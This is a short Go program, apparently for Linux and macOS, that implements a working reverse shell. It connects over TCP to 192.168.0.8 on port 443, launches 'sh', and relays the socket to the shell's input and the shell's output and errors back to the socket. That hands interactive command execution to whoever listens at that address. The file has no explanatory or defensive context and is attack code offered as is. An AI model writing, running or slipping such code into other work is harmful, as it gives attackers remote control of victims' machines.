// Linux/macOS
package main

import (
	"io"
	"net"
	"os/exec"
	"sync"
)

func s2p(conn net.Conn, cmdStdin io.WriteCloser, wg *sync.WaitGroup) {
	defer wg.Done()
	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		if n > 0 {
			_, err := cmdStdin.Write(buf[:n])
			if err != nil {
				return
			}
		}
	}
}

func p2s(conn net.Conn, cmdStdout io.ReadCloser, wg *sync.WaitGroup) {
	defer wg.Done()
	buf := make([]byte, 1)
	for {
		n, err := cmdStdout.Read(buf)
		if err != nil {
			return
		}
		if n > 0 {
			_, err := conn.Write(buf[:n])
			if err != nil {
				return
			}
		}
	}
}

func main() {
	conn, err := net.Dial("tcp", "192.168.0.8:443")
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := exec.Command("sh")
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		return
	}

	var wg sync.WaitGroup
	wg.Add(2)

	go s2p(conn, stdin, &wg)
	go p2s(conn, stdout, &wg)

	wg.Wait()
	cmd.Wait()
}
